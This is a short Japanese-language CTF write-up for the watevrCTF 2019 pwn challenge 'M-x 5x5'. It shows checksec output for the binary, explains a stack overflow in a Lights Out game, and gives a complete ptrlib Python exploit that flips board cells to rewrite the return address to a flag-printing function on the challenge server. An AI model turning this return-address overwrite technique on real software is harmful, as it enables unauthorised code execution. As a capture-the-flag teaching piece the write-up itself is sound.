# [pwn 277pts] M-x 5x5 - watevrCTF 2019
64ビットバイナリで、DEP以外無効です。
```
$ checksec -f M-x-5x5
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   75 Symbols     No       0               4       M-x-5x5
```
Lights OutプログラムでStack Overflowがあります。
PIEが無効でフラグを出力する関数があるので、リターンアドレスを頑張って1ビットずつ書き換えます。
```python
from ptrlib import *

def flip(x, y):
    logger.info("flipping ({}, {})".format(x, y))
    sock.sendlineafter(": ", "f {} {}".format(x, y))

def overwrite(val, orig=0x400b6f):
    state = orig
    for i in range(8):
        b = (val >> (i * 8)) & 0xff
        for j in range(8):
            a = (state >> (i * 8)) & 0xff
            if (a >> j) & 1 != (b >> j) & 1:
                flip(j, 17 + i)
                mask = 0b11
                if j > 0:
                    mask = (0b111 << (j - 1)) & 0xff
                state ^= (1 << j) << (i * 8)
                state ^= mask << ((i + 1) * 8)

#sock = Process("./M-x-5x5")
sock = Socket("13.53.187.163", 50000)

sock.sendline('')
sock.sendlineafter('? ', '8')

logger.info("overwriting...")
overwrite(0x400738) # skip `push rbp` to avoid movaps

sock.sendlineafter(": ", "q")

sock.interactive()
```

# 感想
面白かったです。
